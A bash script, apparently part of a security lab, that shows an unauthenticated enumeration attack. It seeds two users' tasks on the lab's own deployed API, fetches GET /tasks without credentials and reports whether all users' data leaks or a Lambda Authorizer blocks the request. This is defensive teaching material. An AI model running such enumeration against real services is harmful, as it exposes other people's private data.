#!/usr/bin/env bash
#
# 01-enumeration.sh
# Attack 1: Enumeration
#
# Demonstrates that GET /tasks returns every task from every user in a
# single unauthenticated request. On the hardened version the same
# request should be rejected with 401 Unauthorized before it reaches
# the data.
#
# Usage:
#   ./01-enumeration.sh [vulnerable|hardened]

set -uo pipefail

VERSION="${1:-vulnerable}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TF_DIR="${SCRIPT_DIR}/../../infra/terraform/${VERSION}"

if [ ! -d "$TF_DIR" ]; then
    echo "Error: Terraform directory not found: $TF_DIR"
    exit 1
fi

API=$(terraform -chdir="$TF_DIR" output -raw api_endpoint 2>/dev/null)

if [ -z "$API" ]; then
    echo "Error: could not read api_endpoint from Terraform output."
    echo "Make sure the '$VERSION' version has been deployed in $TF_DIR"
    exit 1
fi

echo "============================================================"
echo "Attack 1: Enumeration"
echo "Target version : $VERSION"
echo "API endpoint   : $API"
echo "============================================================"
echo

echo "[1/3] Creating a task for user alice-001..."
curl -s -X POST "$API/tasks" \
    -H "Content-Type: application/json" \
    -d '{"title":"Alice private task","userId":"alice-001","description":"Should not be visible to other users"}' \
    -o /tmp/enum_alice.json
cat /tmp/enum_alice.json
echo
echo

echo "[2/3] Creating a task for user bob-002..."
curl -s -X POST "$API/tasks" \
    -H "Content-Type: application/json" \
    -d '{"title":"Bob private task","userId":"bob-002","description":"Should not be visible to other users"}' \
    -o /tmp/enum_bob.json
cat /tmp/enum_bob.json
echo
echo

echo "[3/3] Calling GET /tasks with no authentication and no filtering..."
STATUS=$(curl -s -o /tmp/enum_result.json -w "%{http_code}" "$API/tasks")
echo "HTTP status: $STATUS"
echo
cat /tmp/enum_result.json
echo
echo

if [ "$STATUS" = "200" ]; then
    if command -v jq >/dev/null 2>&1; then
        USER_COUNT=$(jq -r '.tasks[].userId' /tmp/enum_result.json | sort -u | wc -l)
    else
        USER_COUNT=$(grep -o '"userId": *"[^"]*"' /tmp/enum_result.json | sort -u | wc -l)
    fi
    echo "RESULT: VULNERABLE"
    echo "The endpoint returned tasks belonging to $USER_COUNT different user(s)"
    echo "in a single unauthenticated request. No caller identity was checked."
elif [ "$STATUS" = "401" ]; then
    echo "RESULT: BLOCKED"
    echo "The Lambda Authorizer rejected the request before it reached the data."
else
    echo "RESULT: UNEXPECTED"
    echo "Received HTTP $STATUS, review the response above."
fi
